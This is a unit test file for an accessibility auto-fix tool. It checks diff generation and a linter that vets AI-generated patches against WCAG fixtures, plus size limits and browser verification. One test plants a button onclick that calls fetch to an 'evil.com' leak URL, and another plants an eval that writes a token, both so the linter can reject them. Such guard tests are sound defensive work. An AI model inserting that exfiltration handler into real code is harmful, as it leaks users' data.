// packages/fixer/test/source-fixer.test.ts
// Unit tests for unified diff generation, security linting, scope constraints,
// and browser verification of source fixes.

import { describe, it, expect } from "vitest";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { computeUnifiedDiff } from "../src/diff.js";
import { lintDiff } from "../src/diffLinter.js";
import { fixSingleSourceFinding } from "../src/sourceLoop.js";
import type { FindingAnalysis } from "@blindspot/ai";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const REPO_ROOT = path.resolve(__dirname, "../../..");
const FIXTURES_DIR = path.resolve(REPO_ROOT, "fixtures/pages");

describe("Source Fixer — Diff Generation & Security Linter", () => {
  it("generates correct unified diff with 3 lines of context", () => {
    const original = `line 1\nline 2\nline 3\n<button>Click</button>\nline 5\nline 6\nline 7\n`;
    const modified = `line 1\nline 2\nline 3\n<button aria-label="Submit">Click</button>\nline 5\nline 6\nline 7\n`;

    const diff = computeUnifiedDiff(original, modified, "index.html");
    expect(diff).toContain("--- a/index.html");
    expect(diff).toContain("+++ b/index.html");
    expect(diff).toContain("@@");
    expect(diff).toContain("-<button>Click</button>");
    expect(diff).toContain("+<button aria-label=\"Submit\">Click</button>");
  });

  it("linter accepts a diff that adds only tabindex, aria, or CSS", () => {
    const original = `<div class="btn">Click</div>`;
    const modified = `<div class="btn" tabindex="0" role="button" aria-label="Action">Click</div>`;

    const diff = computeUnifiedDiff(original, modified);
    const result = lintDiff(diff, original);

    expect(result.valid).toBe(true);
    expect(result.addedLinesCount).toBe(1);
  });

  it("linter rejects a diff when added lines contain fetch()", () => {
    const original = `<button id="btn">Submit</button>`;
    const modified = `<button id="btn" onclick="fetch('https://evil.com/leak')">Submit</button>`;

    const diff = computeUnifiedDiff(original, modified);
    const result = lintDiff(diff, original);

    expect(result.valid).toBe(false);
    expect(result.isSecurityViolation).toBe(true);
    expect(result.reason).toContain("fetch");
  });

  it("linter rejects a diff when added lines contain eval() or localStorage", () => {
    const original = `function save() {}`;
    const modified = `function save() {\n  eval('localStorage.setItem(\"tok\", 123)');\n}`;

    const diff = computeUnifiedDiff(original, modified);
    const result = lintDiff(diff, original);

    expect(result.valid).toBe(false);
    expect(result.isSecurityViolation).toBe(true);
  });

  it("linter allows pre-existing lines with fetch as long as no forbidden APIs were added", () => {
    // Pre-existing user code had fetch, but the fix only added aria-label
    const original = `<script>fetch('/api/data');</script>\n<button>Test</button>`;
    const modified = `<script>fetch('/api/data');</script>\n<button aria-label="Submit">Test</button>`;

    const diff = computeUnifiedDiff(original, modified);
    const result = lintDiff(diff, original);

    expect(result.valid).toBe(true);
  });

  it("linter rejects patches when changed line count is more than 40% of the file", () => {
    const original = `line 1\nline 2\nline 3\nline 4\nline 5\nline 6\nline 7\nline 8\nline 9\nline 10\n`;
    // Replace 6 lines out of 10 (>40%)
    const modified = `line 1\nline 2\nnew 3\nnew 4\nnew 5\nnew 6\nnew 7\nnew 8\nline 9\nline 10\n`;

    const diff = computeUnifiedDiff(original, modified);
    const result = lintDiff(diff, original);

    expect(result.valid).toBe(false);
    expect(result.isSizeViolation).toBe(true);
    expect(result.reason).toBe("fix too large, not applied");
  });

  it("linter rejects patches where more than 3 regions changed per finding", () => {
    // Generate a file with 4 far-apart changes creating 4 hunks
    const original = Array.from({ length: 40 }, (_, i) => `line ${i + 1}`).join("\n");
    const modLines = Array.from({ length: 40 }, (_, i) => `line ${i + 1}`);
    modLines[2] = "changed line 3";
    modLines[12] = "changed line 13";
    modLines[22] = "changed line 23";
    modLines[32] = "changed line 33";
    const modified = modLines.join("\n");

    const diff = computeUnifiedDiff(original, modified);
    const result = lintDiff(diff, original);

    expect(result.valid).toBe(false);
    expect(result.isSizeViolation).toBe(true);
    expect(result.regionsCount).toBeGreaterThan(3);
    expect(result.reason).toBe("fix too large, not applied");
  });
});

describe("Source Fixer — Airgapped Browser Verification with Mocked Ultra Calls", () => {
  it("B01 produces a verified diff when Ultra call is mocked with known-good modifiedSource", async () => {
    const htmlPath = path.join(FIXTURES_DIR, "B01-keyboard-trap.html");
    const source = fs.readFileSync(htmlPath, "utf-8");

    const finding: FindingAnalysis = {
      detectorId: "D1",
      severity: "blocker",
      wcag: {
        id: "2.1.2",
        name: "No Keyboard Trap",
        level: "A",
        referenceUrl: "https://www.w3.org/WAI/WCAG22/quickref/#no-keyboard-trap",
      },
      selector: "#newsletter-dialog",
      stateLabel: "S0",
      impact: "Focus is trapped inside dialog. Tab wraps around indefinitely.",
      confidence: 1,
    };

    // Known-good fix: remove the artificial preventDefault Tab trapping so Tab can leave dialog
    const knownGoodModifiedSource = source
      .replace("e.preventDefault();\n        trapElements[0].focus();", "// Tab trap removed to allow natural focus exit")
      .replace("e.preventDefault();\n        trapElements[2].focus();", "// Tab trap removed to allow natural focus exit");

    const result = await fixSingleSourceFinding(source, finding, {
      beforeHits: [
        {
          detectorId: "D8",
          selector: "#newsletter-dialog",
          severity: "blocker",
          wcagId: "2.4.3",
          stateLabel: "S0",
          stopIndexes: [],
          evidence: "Pre-existing dialog focus management issue.",
          confidence: 1,
        },
      ],
      maxAttempts: 1,
      fixGenerator: async () => ({
        modifiedSource: knownGoodModifiedSource,
        explanation: "Removed artificial e.preventDefault() Tab loop so keyboard focus can leave the dialog.",
        changedRegionsHint: ["Removed Tab trapping preventDefault calls"],
      }),
    });

    expect(result.status).toBe("verified");
    expect(result.diff).toContain("+        // Tab trap removed to allow natural focus exit");
    expect(result.attempts).toBe(1);
    expect(result.verificationEvidence).toContain("Fix verified in airgapped browser session");
  }, 20000);

  it(
    "B02 produces a verified diff when Ultra call is mocked with known-good modifiedSource",
    async () => {
      const htmlPath = path.join(FIXTURES_DIR, "B02-custom-dropdown.html");
      const source = fs.readFileSync(htmlPath, "utf-8");

      const finding: FindingAnalysis = {
        detectorId: "D2",
        severity: "major",
        wcag: {
          id: "2.1.1",
          name: "Keyboard",
          level: "A",
          referenceUrl: "https://www.w3.org/WAI/WCAG22/quickref/#keyboard",
        },
        selector: "#dept-trigger",
        stateLabel: "S0",
        impact: "Custom select trigger div has no tabindex and cannot receive keyboard focus.",
        confidence: 1,
      };

      // Known-good fix: add tabindex="0" and role="button" to the trigger
      const knownGoodModifiedSource = source.replace(
        'id="dept-trigger"',
        'id="dept-trigger" tabindex="0" role="button"'
      );

      const result = await fixSingleSourceFinding(source, finding, {
        maxAttempts: 1,
        fixGenerator: async () => ({
          modifiedSource: knownGoodModifiedSource,
          explanation: "Added tabindex=0 and role=button to custom select trigger.",
          changedRegionsHint: ["Added tabindex and role attributes to #dept-trigger"],
        }),
      });

      expect(result.status).toBe("verified");
      expect(result.diff).toContain('+        <div class="select-trigger" id="dept-trigger" tabindex="0" role="button"');
    },
    20000
  );

  it("B04 produces a verified diff when Ultra call is mocked with known-good modifiedSource", async () => {
    const htmlPath = path.join(FIXTURES_DIR, "B04-outline-reset.html");
    const source = fs.readFileSync(htmlPath, "utf-8");

    const finding: FindingAnalysis = {
      detectorId: "D3",
      severity: "major",
      wcag: {
        id: "2.4.7",
        name: "Focus Visible",
        level: "AA",
        referenceUrl: "https://www.w3.org/WAI/WCAG22/quickref/#focus-visible",
      },
      selector: "nav li a",
      stateLabel: "S0",
      impact: "Global outline reset removes visible focus indicator.",
      confidence: 1,
    };

    // Known-good fix: replace outline: none !important with focus-visible outline
    const knownGoodModifiedSource = source.replace(
      "outline: none !important;",
      ":focus-visible { outline: 2px solid #1e3a5f !important; }"
    );

    const result = await fixSingleSourceFinding(source, finding, {
      maxAttempts: 1,
      fixGenerator: async () => ({
        modifiedSource: knownGoodModifiedSource,
        explanation: "Replaced global outline: none with high-contrast :focus-visible outline.",
        changedRegionsHint: ["Replaced global outline reset in stylesheet"],
      }),
    });

    expect(result.status).toBe("verified");
    expect(result.diff).toContain("+    :focus-visible { outline: 2px solid #1e3a5f !important; }");
  }, 20000);

  it("verification fails correctly and marks status unverified when mocked fix does nothing", async () => {
    const htmlPath = path.join(FIXTURES_DIR, "B01-keyboard-trap.html");
    const source = fs.readFileSync(htmlPath, "utf-8");

    const finding: FindingAnalysis = {
      detectorId: "D1",
      severity: "blocker",
      wcag: {
        id: "2.1.2",
        name: "No Keyboard Trap",
        level: "A",
        referenceUrl: "https://www.w3.org/WAI/WCAG22/quickref/#no-keyboard-trap",
      },
      selector: "#subscribe-btn",
      stateLabel: "S0",
      impact: "Focus trap.",
      confidence: 1,
    };

    // Mock fix returns source unchanged
    const result = await fixSingleSourceFinding(source, finding, {
      maxAttempts: 2,
      fixGenerator: async () => ({
        modifiedSource: source, // No change!
        explanation: "Did nothing",
        changedRegionsHint: [],
      }),
    });

    expect(result.status).toBe("unverified");
    expect(result.attempts).toBe(2);
    expect(result.verificationEvidence).toContain("the proposed fix did not make any changes");
  }, 20000);
});
